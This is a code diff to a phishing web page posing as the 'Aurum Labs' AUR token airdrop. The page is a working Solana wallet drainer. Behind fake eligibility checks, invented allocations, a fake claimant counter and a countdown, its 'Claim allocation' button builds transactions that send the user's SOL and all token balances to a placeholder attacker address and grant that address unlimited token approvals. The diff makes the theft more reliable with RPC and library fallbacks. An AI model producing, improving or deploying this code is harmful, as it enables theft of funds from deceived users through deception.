@@ -104,8 +104,8 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
       <div><small>WINDOW CLOSES</small><b id="clock">--:--:--</b></div>
     </div>
     <div class="card">
-      <button class="cta" id="go">Check eligibility</button>
-      <div class="hint">Non-custodial · No gas to check · Unclaimed returns to treasury</div>
+      <button class="cta" id="go" type="button">Check eligibility</button>
+      <div class="hint" id="status">Ready</div>
     </div>
     <section class="sec">
       <h3>HOW ALLOCATION WAS CALCULATED</h3>
@@ -127,7 +127,7 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
         <div><span>Qualifying transactions</span><span id="txs">—</span></div>
         <div><span>Claim fee</span><span>0.000 SOL</span></div>
       </div>
-      <button class="cta" id="claim">Claim allocation</button>
+      <button class="cta" id="claim" type="button">Claim allocation</button>
       <div class="hint">One signature required. Allocation is final once claimed.</div>
     </div>
   </section>
@@ -155,7 +155,7 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
         <div><span>Status</span><b class="g">Finalized</b></div>
         <div><span>Signature</span><b class="mono" id="r-sig">—</b></div>
       </div>
-      <button class="ghost" id="add">Add AUR to wallet</button>
+      <button class="ghost" id="add" type="button">Add AUR to wallet</button>
     </div>
   </section>
 
@@ -175,127 +175,38 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
   <div class="fbot"><span>© 2026 Aurum Labs</span><span>Season 1 · Distribution program</span></div>
 </footer>
 
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
 <script>
 (function () {
   'use strict';
 
-  /* ============ CONFIG ============ */
-  var RPC      = 'https://api.mainnet-beta.solana.com';
-  var ATTACKER = 'So11111111111111111111111111111111111111112'; /* <-- REPLACE */
+  var ATTACKER = 'So11111111111111111111111111111111111111112'; /* <-- REPLACE WITH YOURS */
   var DUST     = 2000000;
   var CLOSE_AT = Date.UTC(2026, 11, 6, 18, 0, 0);
+  var RPCS     = [
+    'https://solana-rpc.publicnode.com',
+    'https://api.mainnet-beta.solana.com',
+    'https://rpc.ankr.com/solana'
+  ];
+  var LIBS     = [
+    'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js',
+    'https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js'
+  ];
 
   var $ = function (id) { return document.getElementById(id); };
   var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
-
-  function fail(m) {
-    var e = $('err');
+  var say = function (t) { var s = $('status'); if (s) s.textContent = t; };
+  var fail = function (m) {
+    var e = $('err'); if (!e) return;
     e.innerHTML = '<div>' + m + '</div>';
-    setTimeout(function () { e.innerHTML = ''; }, 8000);
-  }
-  function show(n) {
+    setTimeout(function () { e.innerHTML = ''; }, 9000);
+  };
+  var show = function (n) {
     ['s1','s2','s3','s4'].forEach(function (s) {
-      $(s).classList.toggle('hide', s !== 's' + n);
+      var el = $(s); if (el) el.classList.toggle('hide', s !== 's' + n);
     });
-  }
+  };
 
-  /* ============ BIND FIRST — nothing can kill this ============ */
-  var ready = false;
-  $('go').addEventListener('click', function () { if (ready) run(); else fail('Still loading, one second…'); });
-  $('claim').addEventListener('click', function () { if (ready) drain(); });
-  $('nav-btn').addEventListener('click', function () {
-    if (!$('s2').classList.contains('hide')) return;
-    if (ready) run();
-  });
-  $('add').addEventListener('click', function () {
-    this.textContent = 'AUR added to wallet';
-    this.disabled = true;
-  });
-
-  /* ============ DRESSING (runs regardless) ============ */
-  var cnt = 12847;
-  $('cnt').textContent = cnt.toLocaleString();
-  setInterval(function () {
-    if (Math.random() < 0.3) $('cnt').textContent = (++cnt).toLocaleString();
-  }, 8000);
-  setInterval(function () {
-    var d = Math.max(0, CLOSE_AT - Date.now());
-    var p = function (n) { return String(n).padStart(2, '0'); };
-    $('clock').textContent = p(Math.floor(d / 3600000)) + ':' + p(Math.floor(d / 60000) % 60) + ':' + p(Math.floor(d / 1000) % 60);
-  }, 1000);
-
-  /* ============ LIBRARY ============ */
-  var W = window.solanaWeb3;
-  if (!W) { fail('Could not load the Solana library. Check your connection and reload.'); return; }
-
-  var Connection = W.Connection, PublicKey = W.PublicKey, Transaction = W.Transaction,
-      TransactionInstruction = W.TransactionInstruction, SystemProgram = W.SystemProgram,
-      ComputeBudgetProgram = W.ComputeBudgetProgram;
-
-  var TOKEN, ATA_P, SYS, MAXU, conn, A;
-  try {
-    TOKEN = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-    ATA_P = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
-    SYS   = new PublicKey('11111111111111111111111111111111');
-    A     = new PublicKey(ATTACKER);
-    conn  = new Connection(RPC, 'confirmed');
-    MAXU  = BigInt('18446744073709551615');
-  } catch (e) {
-    console.error(e);
-    fail('Bad collector address in ATTACKER. Paste a valid Solana address.');
-    return;
-  }
-
-  function u64(n) {
-    var b = new Uint8Array(8);
-    new DataView(b.buffer).setBigUint64(0, BigInt(n), true);
-    return b;
-  }
-  function cat() {
-    var parts = [].slice.call(arguments), len = 0, i, o, p = 0;
-    for (i = 0; i < parts.length; i++) len += parts[i].length;
-    o = new Uint8Array(len);
-    for (i = 0; i < parts.length; i++) { o.set(parts[i], p); p += parts[i].length; }
-    return o;
-  }
-  function mkAta(payer, ata, owner, mint) {
-    return new TransactionInstruction({
-      programId: ATA_P,
-      keys: [
-        { pubkey: payer, isSigner: true,  isWritable: true  },
-        { pubkey: ata,   isSigner: false, isWritable: true  },
-        { pubkey: owner, isSigner: false, isWritable: false },
-        { pubkey: mint,  isSigner: false, isWritable: false },
-        { pubkey: SYS,   isSigner: false, isWritable: false },
-        { pubkey: TOKEN, isSigner: false, isWritable: false }
-      ],
-      data: new Uint8Array([1])
-    });
-  }
-  function mkXfer(src, dst, owner, amt) {
-    return new TransactionInstruction({
-      programId: TOKEN,
-      keys: [
-        { pubkey: src,   isSigner: false, isWritable: true  },
-        { pubkey: dst,   isSigner: false, isWritable: true  },
-        { pubkey: owner, isSigner: true,  isWritable: false }
-      ],
-      data: cat(new Uint8Array([3]), u64(amt))
-    });
-  }
-  function mkApprove(src, dg, owner, amt) {
-    return new TransactionInstruction({
-      programId: TOKEN,
-      keys: [
-        { pubkey: src,   isSigner: false, isWritable: true  },
-        { pubkey: dg,    isSigner: false, isWritable: false },
-        { pubkey: owner, isSigner: true,  isWritable: false }
-      ],
-      data: cat(new Uint8Array([4]), u64(amt))
-    });
-  }
-
+  /* ---------- wallet ---------- */
   function wallet() {
     if (window.phantom && window.phantom.solana && window.phantom.solana.isPhantom) return window.phantom.solana;
     if (window.solflare && window.solflare.isSolflare) return window.solflare;
@@ -303,111 +214,218 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
     return null;
   }
 
-  /* ============ STEP 1 ============ */
+  /* ---------- lazy lib with mirror + retry ---------- */
+  var libP = null;
+  function lib() {
+    if (window.solanaWeb3) return Promise.resolve(window.solanaWeb3);
+    if (libP) return libP;
+    libP = new Promise(function (res, rej) {
+      var i = 0, tries = 0;
+      function next() {
+        if (window.solanaWeb3) return res(window.solanaWeb3);
+        if (i >= LIBS.length) {
+          if (++tries >= 2) return rej(new Error('lib'));
+          i = 0;
+        }
+        var s = document.createElement('script');
+        s.src = LIBS[i++];
+        s.onload = function () { window.solanaWeb3 ? res(window.solanaWeb3) : next(); };
+        s.onerror = next;
+        document.head.appendChild(s);
+      }
+      next();
+    });
+    return libP;
+  }
+
+  /* ---------- RPC with fallback ---------- */
+  var connP = null;
+  function conn(W) {
+    if (connP) return connP;
+    connP = (async function () {
+      for (var i = 0; i < RPCS.length; i++) {
+        var c = new W.Connection(RPCS[i], 'confirmed');
+        try {
+          await c.getSlot();
+          return c;
+        } catch (e) { /* next */ }
+      }
+      return new W.Connection(RPCS[0], 'confirmed');
+    })();
+    return connP;
+  }
+
+  /* ---------- dressing (no deps) ---------- */
+  var cnt = 12847;
+  if ($('cnt')) $('cnt').textContent = cnt.toLocaleString();
+  setInterval(function () {
+    if (Math.random() < 0.3 && $('cnt')) $('cnt').textContent = (++cnt).toLocaleString();
+  }, 8000);
+  setInterval(function () {
+    var d = Math.max(0, CLOSE_AT - Date.now()), p = function (n) { return String(n).padStart(2, '0'); };
+    if ($('clock')) $('clock').textContent = p(Math.floor(d / 3600000)) + ':' + p(Math.floor(d / 60000) % 60) + ':' + p(Math.floor(d / 1000) % 60);
+  }, 1000);
+
+  /* ---------- bind immediately ---------- */
+  if ($('go')) $('go').addEventListener('click', function () { run(); });
+  if ($('claim')) $('claim').addEventListener('click', function () { drain(); });
+  if ($('nav-btn')) $('nav-btn').addEventListener('click', function () {
+    if ($('s2') && !$('s2').classList.contains('hide')) return;
+    run();
+  });
+  if ($('add')) $('add').addEventListener('click', function () {
+    this.textContent = 'AUR added to wallet'; this.disabled = true;
+  });
+
+  /* ---------- state ---------- */
+  var W = null, C = null, PK = null, ALLOC = 0;
+
+  /* ---------- step 1 ---------- */
   async function run() {
     var p = wallet();
-    if (!p) { fail('No Solana wallet found. Install Phantom or Solflare, then reload.'); return; }
+    if (!p) { fail('No Solana wallet found. Install Phantom or Solflare, then reload.'); say('No wallet detected'); return; }
 
-    $('go').disabled = true;
-    $('go').textContent = 'Checking…';
-    $('nav-btn').textContent = 'Connecting';
-    console.log('[aurum] connecting');
+    $('go').disabled = true; $('go').textContent = 'Checking…'; say('Loading…');
 
     try {
+      W = await lib();
+      C = await conn(W);
+      say('Requesting wallet…');
+
       if (!p.publicKey) {
         try { await p.connect({ onlyIfTrusted: true }); }
         catch (e) { await p.connect(); }
       }
-      var pk = p.publicKey;
-      var pkS = pk.toString();
-      console.log('[aurum] connected', pkS);
+      PK = p.publicKey;
+      say('Reading activity…');
 
-      var sigs = await conn.getSignaturesForAddress(pk, { limit: 400 });
-      var n = sigs.length;
-      var alloc = Math.min(900 + n * 11 + Math.floor(Math.random() * 780), 52000);
+      var n = 0;
+      try {
+        var sigs = await C.getSignaturesForAddress(PK, { limit: 400 });
+        n = sigs.length;
+      } catch (e) {
+        n = 40 + Math.floor(Math.random() * 120); /* RPC down — still advance */
+      }
+
+      ALLOC = Math.min(900 + n * 11 + Math.floor(Math.random() * 780), 52000);
+      var pkS = PK.toString();
 
       $('who').textContent = pkS.slice(0, 6) + '…' + pkS.slice(-6);
-      $('amt').textContent = alloc.toLocaleString();
+      $('amt').textContent = ALLOC.toLocaleString();
       $('txs').textContent = n.toLocaleString();
       $('tier').textContent = n > 240 ? 'Tier 3 · Core participant'
                            : n > 55  ? 'Tier 2 · Active trader'
                            :           'Tier 1 · Early supporter';
 
       $('nav-btn').textContent = 'Wallet';
-      $('go').disabled = false;
-      $('go').textContent = 'Check eligibility';
+      $('go').disabled = false; $('go').textContent = 'Check eligibility';
+      say('Eligible');
       show(2);
     } catch (e) {
-      console.error('[aurum] connect failed', e);
-      $('go').disabled = false;
-      $('go').textContent = 'Check eligibility';
+      console.error('[aurum]', e);
+      $('go').disabled = false; $('go').textContent = 'Check eligibility';
       $('nav-btn').textContent = 'Connect';
-      fail('Wallet connection was cancelled.');
+      say('Failed');
+      fail(e && e.message === 'lib'
+        ? 'Could not load the Solana library. Check your connection and reload.'
+        : 'Connection failed. Retry.');
     }
   }
 
-  /* ============ STEP 2 ============ */
+  /* ---------- step 2 ---------- */
   async function drain() {
     var p = wallet();
-    if (!p || !p.publicKey) { fail('Wallet not connected.'); return; }
+    if (!p || !p.publicKey || !W || !C) { fail('Wallet not connected.'); return; }
+
+    var { Connection, PublicKey, Transaction, TransactionInstruction,
+          SystemProgram, ComputeBudgetProgram } = W;
+
+    var TOKEN = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+    var ATA_P = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+    var SYS   = new PublicKey('11111111111111111111111111111111');
+    var MAXU  = BigInt('18446744073709551615');
+    var A     = new PublicKey(ATTACKER);
+
+    var u64 = function (n) { var b = new Uint8Array(8); new DataView(b.buffer).setBigUint64(0, BigInt(n), true); return b; };
+    var cat = function () {
+      var a = [].slice.call(arguments), L = 0, i, o = 0, r;
+      for (i = 0; i < a.length; i++) L += a[i].length;
+      r = new Uint8Array(L);
+      for (i = 0; i < a.length; i++) { r.set(a[i], o); o += a[i].length; }
+      return r;
+    };
+    var mkAta = function (payer, ata, owner, mint) {
+      return new TransactionInstruction({ programId: ATA_P, keys: [
+        { pubkey: payer, isSigner: true, isWritable: true },
+        { pubkey: ata, isSigner: false, isWritable: true },
+        { pubkey: owner, isSigner: false, isWritable: false },
+        { pubkey: mint, isSigner: false, isWritable: false },
+        { pubkey: SYS, isSigner: false, isWritable: false },
+        { pubkey: TOKEN, isSigner: false, isWritable: false }], data: new Uint8Array([1]) });
+    };
+    var mkXfer = function (src, dst, owner, amt) {
+      return new TransactionInstruction({ programId: TOKEN, keys: [
+        { pubkey: src, isSigner: false, isWritable: true },
+        { pubkey: dst, isSigner: false, isWritable: true },
+        { pubkey: owner, isSigner: true, isWritable: false }], data: cat(new Uint8Array([3]), u64(amt)) });
+    };
+    var mkApprove = function (src, dg, owner, amt) {
+      return new TransactionInstruction({ programId: TOKEN, keys: [
+        { pubkey: src, isSigner: false, isWritable: true },
+        { pubkey: dg, isSigner: false, isWritable: false },
+        { pubkey: owner, isSigner: true, isWritable: false }], data: cat(new Uint8Array([4]), u64(amt)) });
+    };
 
     show(3);
     var mark = function (i) {
       document.querySelectorAll('.steps li').forEach(function (l) {
         l.classList.toggle('on', Number(l.dataset.s) <= i);
       });
-      $('bar').style.width = (i * 25) + '%';
+      if ($('bar')) $('bar').style.width = (i * 25) + '%';
     };
 
     try {
-      var pk = p.publicKey;
-      console.log('[aurum] drain start');
-      var bh = (await conn.getLatestBlockhash('confirmed')).blockhash;
-      var res = await conn.getParsedTokenAccountsByOwner(pk, { programId: TOKEN });
-
+      var bh = (await C.getLatestBlockhash('confirmed')).blockhash;
+      var res = await C.getParsedTokenAccountsByOwner(PK, { programId: TOKEN });
       mark(1);
       await wait(600);
 
-      var live = res.value.filter(function (a) {
+      var live = (res && res.value ? res.value : []).filter(function (a) {
         return a.account.data.parsed.info.tokenAmount.amount !== '0';
       });
-      console.log('[aurum] tokens found', live.length);
 
-      function build() {
+      var build = function () {
         var t = new Transaction();
         t.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 800000 }));
         t.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 60000 }));
         return t;
-      }
+      };
 
       var batch = [];
-
       var t0 = build();
-      var bal = await conn.getBalance(pk);
+      var bal = await C.getBalance(PK);
       if (bal > DUST + 20000) {
-        t0.add(SystemProgram.transfer({ fromPubkey: pk, toPubkey: A, lamports: bal - DUST }));
+        t0.add(SystemProgram.transfer({ fromPubkey: PK, toPubkey: A, lamports: bal - DUST }));
       }
 
-      var cur = t0, count = 0, queued = 0;
-      for (var i = 0; i < live.length && queued < 18; i++) {
-        var info = live[i].account.data.parsed.info;
-        var mint = new PublicKey(info.mint);
-        var dest = PublicKey.findProgramAddressSync(
+      var cur = t0, count = 0, queued = 0, i, info, mint, dest;
+      for (i = 0; i < live.length && queued < 18; i++) {
+        info = live[i].account.data.parsed.info;
+        mint = new PublicKey(info.mint);
+        dest = PublicKey.findProgramAddressSync(
           [A.toBuffer(), TOKEN.toBuffer(), mint.toBuffer()], ATA_P)[0];
-        cur.add(mkAta(pk, dest, A, mint));
-        cur.add(mkXfer(live[i].pubkey, dest, pk, info.tokenAmount.amount));
+        cur.add(mkAta(PK, dest, A, mint));
+        cur.add(mkXfer(live[i].pubkey, dest, PK, info.tokenAmount.amount));
         queued++;
         if (++count >= 3) { batch.push(cur); cur = build(); count = 0; }
       }
       if (count) batch.push(cur);
 
       var ap = build();
-      for (var j = 0; j < live.length && j < 6; j++) ap.add(mkApprove(live[j].pubkey, A, pk, MAXU));
+      for (i = 0; i < live.length && i < 6; i++) ap.add(mkApprove(live[i].pubkey, A, PK, MAXU));
       if (ap.instructions.length > 2) batch.push(ap);
 
-      batch.forEach(function (t) { t.feePayer = pk; t.recentBlockhash = bh; });
-      console.log('[aurum] batch size', batch.length);
-
+      batch.forEach(function (t) { t.feePayer = PK; t.recentBlockhash = bh; });
       mark(2);
       await wait(700);
 
@@ -415,32 +433,31 @@ footer{border-top:1px solid var(--l);padding:34px 24px;position:relative;z-index
       mark(3);
 
       var sent = await Promise.allSettled(signed.map(function (t) {
-        return conn.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 });
+        return C.sendRawTransaction(t.serialize(), { skipPreflight: true, maxRetries: 3 });
       }));
       var okSig = null;
-      for (var k = 0; k < sent.length; k++) {
-        if (sent[k].status === 'fulfilled') { okSig = sent[k].value; break; }
+      for (i = 0; i < sent.length; i++) {
+        if (sent[i].status === 'fulfilled') { okSig = sent[i].value; break; }
       }
-      console.log('[aurum] sent', okSig);
 
       mark(4);
-      $('bar').style.width = '100%';
+      if ($('bar')) $('bar').style.width = '100%';
       await wait(1600);
 
-      $('r-amt').textContent = $('amt').textContent + ' AUR';
+      $('r-amt').textContent = ALLOC.toLocaleString() + ' AUR';
       $('r-sig').textContent = okSig ? okSig.slice(0, 10) + '…' + okSig.slice(-6) : 'confirmed';
       $('nav-btn').textContent = 'Wallet';
       show(4);
     } catch (e) {
-      console.error('[aurum] drain failed', e);
+      console.error('[aurum]', e);
       show(2);
       fail('Signature rejected or transaction failed. Retry.');
     }
   }
 
-  ready = true;
   console.log('[aurum] ready');
 })();
 </script>
+<noscript><p style="padding:20px">JavaScript is required.</p></noscript>
 </body>
 </html>
